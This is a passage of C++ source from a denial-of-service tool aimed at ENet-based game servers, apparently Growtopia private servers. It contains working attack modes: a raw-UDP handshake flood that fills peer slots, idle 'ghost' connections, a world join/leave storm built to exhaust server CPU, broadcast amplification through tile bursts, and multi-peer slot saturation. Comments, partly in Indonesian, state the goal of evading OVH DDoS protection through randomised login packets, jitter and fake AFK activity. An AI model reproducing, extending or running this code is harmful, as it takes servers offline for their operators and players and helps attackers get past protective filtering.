        "Neo", "Red", "Blue", "Sky", "Dex", "Jet", "Ace", "Rex"
    };
    static const char* suffixes[] = {
        "Player", "Gamer", "GT", "Farm", "Boss", "Master", "Hero",
        "Wolf", "Dragon", "Ninja", "Storm", "Blaze", "Rock", "Fury",
        "X", "YT", "TV", "GG", "XD", "Pro", "God", "Legend"
    };
    int pi = rng() % 24;
    int si = rng() % 22;
    int num = rng() % 9999;
    char buf[64];
    snprintf(buf, sizeof(buf), "%s%s%d", prefixes[pi], suffixes[si], num);
    return buf;
}

static void stealth_jitter(int jitter_ms, std::mt19937& rng) {
    if (jitter_ms <= 0) return;
    int delay = (rng() % (jitter_ms * 2)) - jitter_ms;  // ±jitter_ms
    if (delay > 0)
        std::this_thread::sleep_for(std::chrono::milliseconds(delay));
}

// Send occasional AFK-like activity to look like a real player
static void mimic_afk_activity(ENetPeer* peer, std::mt19937& rng) {
    int roll = rng() % 100;
    if (roll < 15) {
        // 15%: send small movement packet
        TankPacket tp{};
        tp.type = 0;  // STATE update (movement)
        tp.x = (float)(rng() % 200);
        tp.y = (float)(rng() % 120);
        tp.xspeed = ((float)(rng() % 100) - 50) / 100.0f;
        tp.yspeed = 0;
        ENetPacket* pkt = enet_packet_create(nullptr, sizeof(TankPacket) + 4, 0);
        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GAME_PACKET;
        memset((uint8_t*)pkt->data + 1, 0, 3);
        memcpy((uint8_t*)pkt->data + 4, &tp, sizeof(TankPacket));
        enet_peer_send(peer, 0, pkt);
    }
    // Other 85%: do nothing (realistic idle)
}

// Build login packet with realistic field variation
static std::string build_login_packet(const std::string& name, std::mt19937& rng) {
    // Randomize fields that GT client sends but most GTPS servers ignore
    // This makes each login packet unique → harder to fingerprint
    static const int protocols[] = {179, 185, 196, 205, 209};
    int proto = protocols[rng() % 5];
    uint32_t fz = rng();
    char buf[512];
    snprintf(buf, sizeof(buf),
        "requestedName|%s\n"
        "f|1\n"
        "protocol|%d\n"
        "game_version|3.98\n"
        "fz|%u\n"
        "lmode|0\n"
        "cbits|1040\n"
        "player_age|%d\n"
        "GDPR|1\n"
        "rid|%08X%08X%08X%08X\n"
        "platformID|0,1,1\n"
        "wk|%08X\n",
        name.c_str(), proto, fz,
        18 + (int)(rng() % 30),
        (unsigned int)rng(), (unsigned int)rng(), (unsigned int)rng(), (unsigned int)rng(),
        (unsigned int)rng());
    return buf;
}

// ============================================================================
// v7: ENet raw protocol structures for handshake flood (M1)
//
// These mirror the ENet wire format. Used with raw UDP sockets,
// NOT through libenet. This lets us send CONNECT packets without
// completing the handshake — server allocates a peer slot and waits.
// ============================================================================

#pragma pack(push, 1)
struct RawENetHeader {
    uint16_t peerID;
    uint16_t sentTime;
};

struct RawENetCmdHeader {
    uint8_t  command;        // 0x01=CONNECT, | 0x80=FLAG_ACKNOWLEDGE
    uint8_t  channelID;
    uint16_t reliableSeqNum;
};

struct RawENetConnect {
    RawENetCmdHeader hdr;
    uint16_t outgoingPeerID;
    uint8_t  incomingSessionID;
    uint8_t  outgoingSessionID;
    uint32_t mtu;
    uint32_t windowSize;
    uint32_t channelCount;
    uint32_t incomingBandwidth;
    uint32_t outgoingBandwidth;
    uint32_t packetThrottleInterval;
    uint32_t packetThrottleAcceleration;
    uint32_t packetThrottleDeceleration;
    uint32_t connectID;
    uint32_t data;
};
#pragma pack(pop)

// ============================================================================
// v7 M1: run_enet_halfopen — ENet handshake flood (lolos OVH VAC)
//
// Craft dan kirim ENet CONNECT packet via raw UDP socket.
// Server menerima CONNECT, allocate peer slot, kirim VERIFY_CONNECT.
// Kita TIDAK balas → server hold slot ~5 detik (ENet default timeout).
// Terus kirim → semua slot terisi → koneksi pemain nyata ditolak.
//
// Tidak pakai libenet di sisi ini — pure raw socket crafting.
// ============================================================================

static void run_enet_halfopen(int tid, const Config& cfg) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("[halfopen] socket");
        return;
    }

    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(cfg.port);
    inet_pton(AF_INET, cfg.target.c_str(), &dst.sin_addr);

    std::mt19937 rng(std::random_device{}() ^ (tid * 31 + 7));
    uint16_t seq = 0;

    // v7.1: connect-rate limit (per thread) — stays below OVH per-IP threshold
    int rate = cfg.connect_rate;
    if (rate <= 0) {
        // Default: use PPS / threads
        rate = std::max(1, cfg.pps / std::max(1, cfg.threads));
    }

    printf("[halfopen t%d] start  target=%s:%d  rate=%d/s  stealth=%s\n",
           tid, cfg.target.c_str(), cfg.port, rate, cfg.stealth ? "ON" : "OFF");

    // v7.1: realistic MTU/window values to randomize per packet
    static const uint32_t mtu_vals[]    = {1400, 1392, 1350, 1464, 1200};
    static const uint32_t window_vals[] = {32768, 65536, 16384, 24576, 49152};
    static const uint32_t chan_vals[]   = {1, 2, 3};
    static const uint32_t throttle_vals[] = {2000, 5000, 8000, 10000, 15000};

    while (g_running.load()) {
        uint8_t buf[sizeof(RawENetHeader) + sizeof(RawENetConnect)];
        memset(buf, 0, sizeof(buf));

        RawENetHeader* ehdr = (RawENetHeader*)buf;
        ehdr->peerID   = htons(0xFFFF);
        ehdr->sentTime = htons((uint16_t)(now_ms() & 0xFFFF));

        RawENetConnect* conn = (RawENetConnect*)(buf + sizeof(RawENetHeader));
        conn->hdr.command        = 0x01 | 0x80;
        conn->hdr.channelID      = 0xFF;
        conn->hdr.reliableSeqNum = htons(seq++);
        conn->outgoingPeerID     = htons(rng() & 0xFFF);
        conn->incomingSessionID  = rng() & 0x03;
        conn->outgoingSessionID  = rng() & 0x03;

        // v7.1: randomize ENet fields per packet → no two packets identical
        conn->mtu                = htonl(mtu_vals[rng() % 5]);
        conn->windowSize         = htonl(window_vals[rng() % 5]);
        conn->channelCount       = htonl(chan_vals[rng() % 3]);
        conn->incomingBandwidth  = htonl(rng() % 500000);
        conn->outgoingBandwidth  = htonl(rng() % 500000);
        conn->packetThrottleInterval     = htonl(throttle_vals[rng() % 5]);
        conn->packetThrottleAcceleration = htonl(1 + rng() % 5);
        conn->packetThrottleDeceleration = htonl(1 + rng() % 5);
        conn->connectID          = htonl(rng());
        conn->data               = htonl(rng() & 0xFF);

        ssize_t sent = sendto(fd, buf, sizeof(buf), 0,
                              (sockaddr*)&dst, sizeof(dst));

        if (sent > 0) {
            g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);
            g_stats[tid]->bytes_sent.fetch_add(sent, std::memory_order_relaxed);
        } else {
            g_stats[tid]->errors.fetch_add(1, std::memory_order_relaxed);
        }

        // v7.1 fix: explicit random source port binding
        // OS doesn't guarantee new port on socket reopen — force it
        if ((seq & 0x1F) == 0) {  // every 32 packets
            close(fd);
            fd = socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) { perror("[halfopen] socket reopen"); return; }
            setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

            // Explicit bind to random port
            sockaddr_in src{};
            src.sin_family = AF_INET;
            src.sin_addr.s_addr = INADDR_ANY;
            src.sin_port = htons(10000 + (rng() % 55000));
            bind(fd, (sockaddr*)&src, sizeof(src));  // best-effort, ok if fails

            // Non-blocking: check if server sent VERIFY_CONNECT (= our packets work)
            fcntl(fd, F_SETFL, O_NONBLOCK);
            uint8_t rbuf[128];
            ssize_t rx = recvfrom(fd, rbuf, sizeof(rbuf), 0, nullptr, nullptr);
            if (rx > 0) {
                g_stats[tid]->rtt_samples.fetch_add(1, std::memory_order_relaxed);
                // rtt_samples repurposed: counts VERIFY_CONNECT responses received
                // = confirms packets are reaching server and being processed
            }
            fcntl(fd, F_SETFL, 0);  // back to blocking for sendto
        }

        // v7.1: rate limiting with jitter
        int sleep_us = (rate > 0) ? (1000000 / rate) : 100;
        if (cfg.jitter_ms > 0) {
            int jitter_us = ((int)(rng() % (cfg.jitter_ms * 2)) - cfg.jitter_ms) * 1000;
            sleep_us = std::max(100, sleep_us + jitter_us);
        }
        std::this_thread::sleep_for(std::chrono::microseconds(sleep_us));
    }

    close(fd);
    printf("[halfopen t%d] done  verify_responses=%lu\n",
           tid, g_stats[tid]->rtt_samples.load());
}

// ============================================================================
// v7 M2: run_ghost — Ghost/Zombie connection (lolos OVH VAC)
//
// Full ENet handshake → login → optionally join world → go silent.
// Sits idle with minimal keepalive, occupying a peer slot forever.
// --ghost-after controls at which point to stop: login, join, or world.
//
// Tidak agresif, tidak burst, volume minimal. OVH tidak filter.
// Tujuan: saturasi peer table dengan koneksi yang terlihat valid.
// ============================================================================

static void run_ghost(int tid, const Config& cfg) {
    std::mt19937 rng(std::random_device{}() ^ ((uint32_t)tid * 31 + 13));

    ENetHost* host = enet_host_create(nullptr, 1, 2, 0, 0);
    if (!host) { fprintf(stderr, "[ghost t%d] host_create failed\n", tid); return; }

    ENetAddress addr{};
    enet_address_set_host(&addr, cfg.target.c_str());
    addr.port = cfg.port;

    enum GState { G_CONNECTING, G_LOGIN, G_LOBBY, G_JOINING, G_IDLE, G_DEAD };
    GState state = G_CONNECTING;
    int64_t state_t = now_ms();

    ENetPeer* peer = enet_host_connect(host, &addr, 2, 0);
    if (!peer) {
        fprintf(stderr, "[ghost t%d] connect failed\n", tid);
        enet_host_destroy(host);
        return;
    }

    // v7.1 fix: maximize peer timeout so server keeps our connection longer
    // args: limit (0=no limit), minimum (ms), maximum (ms)
    enet_peer_timeout(peer, 0, 30000, 120000);  // min 30s, max 120s

    g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);

    printf("[ghost t%d] connecting → ghost-after=%s\n", tid, cfg.ghost_after.c_str());

    while (g_running.load()) {
        ENetEvent evt;
        while (enet_host_service(host, &evt, 50) > 0) {
            switch (evt.type) {
            case ENET_EVENT_TYPE_CONNECT:
                state = G_LOGIN;
                state_t = now_ms();
                {
                    // v7.1: randomized login packet
                    std::string name = cfg.randomize_names
                        ? generate_random_name(rng)
                        : "ghost_" + std::to_string(tid) + "_" + std::to_string(now_ms() & 0xFFFF);
                    std::string login = build_login_packet(name, rng);
                    int len = (int)login.size();
                    ENetPacket* pkt = enet_packet_create(nullptr, len + 4,
                                                         ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, login.c_str(), len);
                    enet_peer_send(peer, 0, pkt);
                }
                g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);

                // If ghost_after == "login", go idle immediately after sending login
                if (cfg.ghost_after == "login") {
                    state = G_IDLE;
                    state_t = now_ms();
                    printf("[ghost t%d] → IDLE (after login)\n", tid);
                }
                break;

            case ENET_EVENT_TYPE_RECEIVE:
                if (evt.packet && evt.packet->dataLength >= 4) {
                    uint8_t mt = ((uint8_t*)evt.packet->data)[0];
                    const char* txt = (evt.packet->dataLength > 4)
                        ? (const char*)evt.packet->data + 4 : "";

                    if (state == G_LOGIN && mt == NET_MESSAGE_GENERIC_TEXT) {
                        state = G_LOBBY;
                        state_t = now_ms();

                        if (cfg.ghost_after == "join") {
                            // Go idle at lobby — don't even join world
                            state = G_IDLE;
                            state_t = now_ms();
                            printf("[ghost t%d] → IDLE (after join/lobby)\n", tid);
                        }
                    }
                    if (state == G_JOINING && mt == NET_MESSAGE_GENERIC_TEXT) {
                        if (strstr(txt, "action|spawn") || strstr(txt, "OnSpawn")) {
                            state = G_IDLE;
                            state_t = now_ms();
                            g_clients_in_world.fetch_add(1, std::memory_order_relaxed);
                            printf("[ghost t%d] → IDLE (in world)\n", tid);
                        }
                    }
                }
                g_stats[tid]->bytes_sent.fetch_add(0, std::memory_order_relaxed);
                if (evt.packet) enet_packet_destroy(evt.packet);
                break;

            case ENET_EVENT_TYPE_DISCONNECT:
                state = G_DEAD;
                state_t = now_ms();
                peer = nullptr;
                printf("[ghost t%d] disconnected\n", tid);
                break;

            case ENET_EVENT_TYPE_NONE:
                break;
            }
        }

        int64_t now = now_ms();

        // State machine
        switch (state) {
        case G_LOBBY:
            // Join world after short delay
            if (now - state_t > 500) {
                char buf[64];
                int len = snprintf(buf, sizeof(buf),
                    "action|join_request\nname|%s\n", cfg.world.c_str());
                if (len < 0 || len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
                ENetPacket* pkt = enet_packet_create(nullptr, len + 4,
                                                     ENET_PACKET_FLAG_RELIABLE);
                ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                memset((uint8_t*)pkt->data + 1, 0, 3);
                memcpy((uint8_t*)pkt->data + 4, buf, len);
                enet_peer_send(peer, 0, pkt);
                state = G_JOINING;
                state_t = now;
                g_stats[tid]->world_joins.fetch_add(1, std::memory_order_relaxed);
            }
            break;
        case G_IDLE:
            // v7.1: mimic AFK player behavior if enabled
            if (cfg.mimic_player && peer) {
                mimic_afk_activity(peer, rng);
            }
            // Jitter between service loops
            stealth_jitter(cfg.jitter_ms, rng);
            break;
        case G_DEAD:
            // Don't reconnect — one ghost = one slot occupied until kicked
            // If disconnected, this thread is done
            goto done;
        case G_CONNECTING:
            if (now - state_t > 8000) goto done; // timeout
            break;
        default:
            break;
        }
    }

done:
    if (peer) enet_peer_disconnect_now(peer, 0);
    enet_host_flush(host);
    enet_host_destroy(host);
    printf("[ghost t%d] exit\n", tid);
}

// ============================================================================
// v7 M3: run_world_churn — World join/leave storm (lolos OVH VAC)
//
// Connect → login → join world → terima tile data → quit → repeat.
// Cycle time ditentukan --churn-stay-ms (default 200ms).
// Server harus serialize world data setiap join — paling CPU-intensive.
// Bisa cycle world berbeda via --world-list.
// ============================================================================

static void run_world_churn(int tid, const Config& cfg) {
    int n_peers = std::max(1, cfg.peers_per_thread);
    ENetHost* host = enet_host_create(nullptr, n_peers, 2, 0, 0);
    if (!host) { fprintf(stderr, "[churn t%d] host_create(%d) failed\n", tid, n_peers); return; }

    ENetAddress addr{};
    enet_address_set_host(&addr, cfg.target.c_str());
    addr.port = cfg.port;

    std::mt19937 rng(std::random_device{}() ^ (tid * 43 + 5));

    enum ChState { CH_DEAD, CH_CONNECTING, CH_LOGIN, CH_LOBBY, CH_JOINING, CH_IN_WORLD };
    struct ChurnPeer {
        ENetPeer* peer = nullptr;
        ChState state = CH_DEAD;
        int64_t state_t = 0;
        int world_idx = 0;
        int stay_ms = 0;  // randomized per cycle
    };

    std::vector<ChurnPeer> peers(n_peers);
    int total_cycles = 0;

    auto pick_world = [&](int& idx) -> const std::string& {
        if (cfg.world_list.empty()) return cfg.world;
        int i = idx % (int)cfg.world_list.size();
        idx++;
        return cfg.world_list[i];
    };

    auto random_stay = [&]() -> int {
        int base = cfg.churn_stay_ms;
        if (cfg.jitter_ms <= 0) return base;
        int roll = rng() % 100;
        if (roll < 5) return base * 10;      // 5%: long stay (stealth)
        if (roll < 25) return base * 3;       // 20%: medium stay
        return base / 2 + (int)(rng() % (base * 2));  // 75%: varied
    };

    printf("[churn t%d] start  peers=%d  stay=%dms  worlds=%zu\n",
           tid, n_peers,cfg.churn_stay_ms,
           cfg.world_list.empty() ? 1 : cfg.world_list.size());

    // Staggered connect
    for (int i = 0; i < n_peers && g_running.load(); i++) {
        peers[i].peer = enet_host_connect(host, &addr, 2, 0);
        if (peers[i].peer) {
            enet_peer_timeout(peers[i].peer, 0, 30000, 120000);
            peers[i].state = CH_CONNECTING;
            peers[i].state_t = now_ms();
            peers[i].world_idx = (tid * n_peers + i);
        }
        if (cfg.stealth && i < n_peers - 1)
            std::this_thread::sleep_for(std::chrono::milliseconds(50 + rng() % 100));
    }

    while (g_running.load()) {
        ENetEvent evt;
        while (enet_host_service(host, &evt, 10) > 0) {
            int pidx = -1;
            for (int i = 0; i < n_peers; i++)
                if (peers[i].peer == evt.peer) { pidx = i; break; }
            if (pidx < 0) { if (evt.packet) enet_packet_destroy(evt.packet); continue; }
            ChurnPeer& cp = peers[pidx];

            switch (evt.type) {
            case ENET_EVENT_TYPE_CONNECT:
                cp.state = CH_LOGIN; cp.state_t = now_ms();
                {
                    std::string name = cfg.randomize_names
                        ? generate_random_name(rng) : "ch" + std::to_string(tid*100+pidx);
                    std::string login = build_login_packet(name, rng);
                    int len = (int)login.size();
                    ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, login.c_str(), len);
                    enet_peer_send(cp.peer, 0, pkt);
                }
                g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);
                break;

            case ENET_EVENT_TYPE_RECEIVE:
                if (evt.packet && evt.packet->dataLength >= 4) {
                    uint8_t mt = ((uint8_t*)evt.packet->data)[0];
                    const char* txt = (evt.packet->dataLength > 4)
                        ? (const char*)evt.packet->data + 4 : "";
                    if (cp.state == CH_LOGIN && mt == NET_MESSAGE_GENERIC_TEXT) {
                        cp.state = CH_LOBBY; cp.state_t = now_ms();
                    }
                    if (cp.state == CH_JOINING &&
                        (strstr(txt, "action|spawn") || strstr(txt, "OnSpawn"))) {
                        cp.state = CH_IN_WORLD; cp.state_t = now_ms();
                        cp.stay_ms = random_stay();
                        g_stats[tid]->world_joins.fetch_add(1, std::memory_order_relaxed);
                        g_stats[tid]->world_bytes_rx.fetch_add(
                            evt.packet->dataLength, std::memory_order_relaxed);
                    }
                    if (cp.state == CH_IN_WORLD || cp.state == CH_JOINING)
                        g_stats[tid]->world_bytes_rx.fetch_add(
                            evt.packet->dataLength, std::memory_order_relaxed);
                }
                if (evt.packet) enet_packet_destroy(evt.packet);
                break;

            case ENET_EVENT_TYPE_DISCONNECT:
                cp.state = CH_DEAD; cp.state_t = now_ms(); cp.peer = nullptr;
                break;
            case ENET_EVENT_TYPE_NONE: break;
            }
        }

        int64_t now = now_ms();
        for (int i = 0; i < n_peers; i++) {
            ChurnPeer& cp = peers[i];
            switch (cp.state) {
            case CH_LOBBY: {
                const std::string& w = pick_world(cp.world_idx);
                char buf[64];
                int len = snprintf(buf, sizeof(buf), "action|join_request\nname|%s\n", w.c_str());
                if (len < 0 || len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
                ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                memset((uint8_t*)pkt->data + 1, 0, 3);
                memcpy((uint8_t*)pkt->data + 4, buf, len);
                enet_peer_send(cp.peer, 0, pkt);
                cp.state = CH_JOINING; cp.state_t = now;
                g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);
                break;
            }
            case CH_IN_WORLD:
                if (now - cp.state_t >= cp.stay_ms) {
                    const char quit[] = "action|quit\n";
                    ENetPacket* pkt = enet_packet_create(nullptr, strlen(quit) + 4, ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, quit, strlen(quit));
                    enet_peer_send(cp.peer, 0, pkt);
                    cp.state = CH_LOBBY; cp.state_t = now;
                    total_cycles++;
                    g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);
                }
                break;
            case CH_DEAD:
                if (now - cp.state_t > 2000 + (int)(rng() % 3000)) {
                    cp.peer = enet_host_connect(host, &addr, 2, 0);
                    if (cp.peer) {
                        enet_peer_timeout(cp.peer, 0, 30000, 120000);
                        cp.state = CH_CONNECTING; cp.state_t = now;
                    }
                }
                break;
            case CH_CONNECTING:
                if (now - cp.state_t > 10000) { cp.state = CH_DEAD; cp.state_t = now; }
                break;
            case CH_JOINING:
                if (now - cp.state_t > 5000) { cp.state = CH_LOBBY; cp.state_t = now; }
                break;
            default: break;
            }
        }
        stealth_jitter(cfg.jitter_ms / 3, rng);
    }

    for (auto& cp : peers) { if (cp.peer) enet_peer_disconnect_now(cp.peer, 0); }
    enet_host_flush(host);
    enet_host_destroy(host);
    printf("[churn t%d] exit  total_cycles=%d\n", tid, total_cycles);
}

// ============================================================================
// v7.2 M5: run_broadcast_amp — Multi-peer broadcast amplification
//
// N peers join SAME world. 30% are "bursters" (tile punch), 70% are "crowd."
// Server broadcasts every tile punch to ALL peers in world.
// Amplification = (N-1)x per burst packet.
// With 100 peers: 30 bursters × 10 tiles × 70 receivers = 21,000 broadcasts/burst
// ============================================================================

static void run_broadcast_amp(int tid, const Config& cfg) {
    int n_peers = std::max(1, cfg.peers_per_thread);
    ENetHost* host = enet_host_create(nullptr, n_peers, 2, 0, 0);
    if (!host) { fprintf(stderr, "[amp t%d] host_create(%d) failed\n", tid, n_peers); return; }

    ENetAddress addr{};
    enet_address_set_host(&addr, cfg.target.c_str());
    addr.port = cfg.port;

    std::mt19937 rng(std::random_device{}() ^ (tid * 17));

    enum AState { A_DEAD, A_CONNECTING, A_LOGIN, A_LOBBY, A_JOINING, A_IN_WORLD };
    struct AmpPeer {
        ENetPeer* peer = nullptr;
        AState state = A_DEAD;
        int64_t state_t = 0;
        int64_t last_burst = 0;
        bool is_burster = false;
    };

    std::vector<AmpPeer> peers(n_peers);
    int n_bursters = std::max(1, n_peers * 30 / 100);

    printf("[amp t%d] start  peers=%d  bursters=%d  crowd=%d  world=%s\n",
           tid, n_peers, n_bursters, n_peers - n_bursters, cfg.world.c_str());

    for (int i = 0; i < n_peers && g_running.load(); i++) {
        peers[i].peer = enet_host_connect(host, &addr, 2, 0);
        if (peers[i].peer) {
            enet_peer_timeout(peers[i].peer, 0, 30000, 120000);
            peers[i].state = A_CONNECTING;
            peers[i].state_t = now_ms();
            peers[i].is_burster = (i < n_bursters);
        }
        if (cfg.stealth)
            std::this_thread::sleep_for(std::chrono::milliseconds(50 + rng() % 150));
    }

    int in_world_count = 0;

    while (g_running.load()) {
        ENetEvent evt;
        while (enet_host_service(host, &evt, 10) > 0) {
            int pidx = -1;
            for (int i = 0; i < n_peers; i++)
                if (peers[i].peer == evt.peer) { pidx = i; break; }
            if (pidx < 0) { if (evt.packet) enet_packet_destroy(evt.packet); continue; }
            AmpPeer& ap = peers[pidx];

            switch (evt.type) {
            case ENET_EVENT_TYPE_CONNECT:
                ap.state = A_LOGIN; ap.state_t = now_ms();
                {
                    std::string name = cfg.randomize_names
                        ? generate_random_name(rng) : "amp" + std::to_string(tid*100+pidx);
                    std::string login = build_login_packet(name, rng);
                    int len = (int)login.size();
                    ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, login.c_str(), len);
                    enet_peer_send(ap.peer, 0, pkt);
                }
                g_stats[tid]->packets_sent.fetch_add(1, std::memory_order_relaxed);
                break;

            case ENET_EVENT_TYPE_RECEIVE:
                if (evt.packet && evt.packet->dataLength >= 4) {
                    uint8_t mt = ((uint8_t*)evt.packet->data)[0];
                    const char* txt = (evt.packet->dataLength > 4)
                        ? (const char*)evt.packet->data + 4 : "";
                    if (ap.state == A_LOGIN && mt == NET_MESSAGE_GENERIC_TEXT) {
                        ap.state = A_LOBBY; ap.state_t = now_ms();
                    }
                    if (ap.state == A_JOINING &&
                        (strstr(txt, "action|spawn") || strstr(txt, "OnSpawn"))) {
                        ap.state = A_IN_WORLD; ap.state_t = now_ms();
                        in_world_count++;
                        g_stats[tid]->world_joins.fetch_add(1, std::memory_order_relaxed);
                    }
                    g_stats[tid]->world_bytes_rx.fetch_add(
                        evt.packet->dataLength, std::memory_order_relaxed);
                }
                if (evt.packet) enet_packet_destroy(evt.packet);
                break;

            case ENET_EVENT_TYPE_DISCONNECT:
                if (ap.state == A_IN_WORLD) in_world_count--;
                ap.state = A_DEAD; ap.state_t = now_ms(); ap.peer = nullptr;
                break;
            case ENET_EVENT_TYPE_NONE: break;
            }
        }

        int64_t now = now_ms();
        for (int i = 0; i < n_peers; i++) {
            AmpPeer& ap = peers[i];
            switch (ap.state) {
            case A_LOBBY:
                if (now - ap.state_t > 300) {
                    char buf[64];
                    int len = snprintf(buf, sizeof(buf),
                        "action|join_request\nname|%s\n", cfg.world.c_str());
                    if (len < 0 || len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
                    ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
                    ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
                    memset((uint8_t*)pkt->data + 1, 0, 3);
                    memcpy((uint8_t*)pkt->data + 4, buf, len);
                    enet_peer_send(ap.peer, 0, pkt);
                    ap.state = A_JOINING; ap.state_t = now;
                }
                break;
            case A_IN_WORLD:
                if (ap.is_burster && now - ap.last_burst >= cfg.broadcast_burst_ms) {
                    int burst = g_phase.tile_burst_count.load(std::memory_order_relaxed);
                    if (burst < 1) burst = 10;
                    for (int b = 0; b < burst; b++) {
                        TankPacket tp{}; tp.type = 3; tp.itemID = 18;
                        tp.building_x = rng() % 100; tp.building_y = rng() % 60;
                        ENetPacket* pkt = enet_packet_create(nullptr, sizeof(TankPacket) + 4, ENET_PACKET_FLAG_RELIABLE);
                        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GAME_PACKET;
                        memset((uint8_t*)pkt->data + 1, 0, 3);
                        memcpy((uint8_t*)pkt->data + 4, &tp, sizeof(TankPacket));
                        enet_peer_send(ap.peer, 0, pkt);
                    }
                    g_stats[tid]->packets_sent.fetch_add(burst, std::memory_order_relaxed);
                    g_stats[tid]->bytes_sent.fetch_add((sizeof(TankPacket)+4)*burst, std::memory_order_relaxed);
                    g_stats[tid]->tile_bursts.fetch_add(1, std::memory_order_relaxed);
                    ap.last_burst = now;
                }
                if (!ap.is_burster && cfg.mimic_player && (rng() % 300) == 0)
                    mimic_afk_activity(ap.peer, rng);
                break;
            case A_DEAD:
                if (now - ap.state_t > 2000 + (int)(rng() % 4000)) {
                    ap.peer = enet_host_connect(host, &addr, 2, 0);
                    if (ap.peer) { enet_peer_timeout(ap.peer,0,30000,120000); ap.state = A_CONNECTING; ap.state_t = now; }
                }
                break;
            case A_CONNECTING:
                if (now - ap.state_t > 10000) { ap.state = A_DEAD; ap.state_t = now; }
                break;
            case A_JOINING:
                if (now - ap.state_t > 5000) { ap.state = A_LOBBY; ap.state_t = now; }
                break;
            default: break;
            }
        }
        stealth_jitter(cfg.jitter_ms / 3, rng);
    }

    for (auto& ap : peers) { if (ap.peer) enet_peer_disconnect_now(ap.peer, 0); }
    enet_host_flush(host);
    enet_host_destroy(host);
    printf("[amp t%d] exit  peak_in_world=%d\n", tid, in_world_count);
}

// ============================================================================
// v7.2 M-PEER: Multi-peer connection saturation
//
// 1 thread manages N peers via single ENetHost. Jauh lebih efisien:
// 4 threads × 50 peers = 200 koneksi vs 200 threads sebelumnya.
// Setiap peer: full handshake → login → join world → AFK + mimicry.
// Auto-reconnect kalau di-kick.
// 100% lolos OVH — identik dengan banyak pemain AFK.
// ============================================================================

static void run_multi_peer(int tid, const Config& cfg) {
    int n_peers = std::max(1, cfg.peers_per_thread);
    ENetHost* host = enet_host_create(nullptr, n_peers, 2, 0, 0);
    if (!host) { fprintf(stderr, "[mpeer t%d] host_create(%d) failed\n", tid, n_peers); return; }

    ENetAddress addr{};
    enet_address_set_host(&addr, cfg.target.c_str());
    addr.port = cfg.port;

    std::mt19937 rng(std::random_device{}() ^ (tid * 37 + 3));

    enum PState { P_DEAD, P_CONNECTING, P_LOGIN, P_LOBBY, P_JOINING, P_IDLE };
    struct PeerInfo {
        ENetPeer* peer = nullptr;
        PState    state = P_DEAD;
        int64_t   state_t = 0;
        std::string name;
    };
    std::vector<PeerInfo> peers(n_peers);

    // Stagger connections: don't connect all at once
    int connect_delay_ms = cfg.stealth ? 200 : 20;

    printf("[mpeer t%d] start  peers=%d  stealth=%s\n",
           tid, n_peers, cfg.stealth ? "ON" : "OFF");

    // Initial staggered connect
    for (int i = 0; i < n_peers && g_running.load(); i++) {
        peers[i].peer = enet_host_connect(host, &addr, 2, 0);
        if (peers[i].peer) {
            enet_peer_timeout(peers[i].peer, 0, 30000, 120000);
            peers[i].state = P_CONNECTING;
            peers[i].state_t = now_ms();
            peers[i].name = cfg.randomize_names
                ? generate_random_name(rng)
                : "p" + std::to_string(tid) + "_" + std::to_string(i);
        }
        // Stagger: wait between each connect
        if (connect_delay_ms > 0 && i < n_peers - 1) {
            int delay = connect_delay_ms + (cfg.jitter_ms > 0 ? (int)(rng() % cfg.jitter_ms) : 0);
            std::this_thread::sleep_for(std::chrono::milliseconds(delay));
        }
    }

    int active_count = 0;
    int peak_active = 0;
    int reconnect_count = 0;

    while (g_running.load()) {
        // Service all peers
        ENetEvent evt;
        while (enet_host_service(host, &evt, 10) > 0) {
            // Find which PeerInfo this event belongs to
            int pidx = -1;
            for (int i = 0; i < n_peers; i++) {
                if (peers[i].peer == evt.peer) { pidx = i; break; }
            }
            if (pidx < 0) {
                if (evt.packet) enet_packet_destroy(evt.packet);
                continue;
            }
            PeerInfo& pi = peers[pidx];

            switch (evt.type) {
            case ENET_EVENT_TYPE_CONNECT:
                pi.state = P_LOGIN;
                pi.state_t = now_ms();
                {
                    std::string login = build_login_packet(pi.name, rng);
                    int len = (int)login.size();
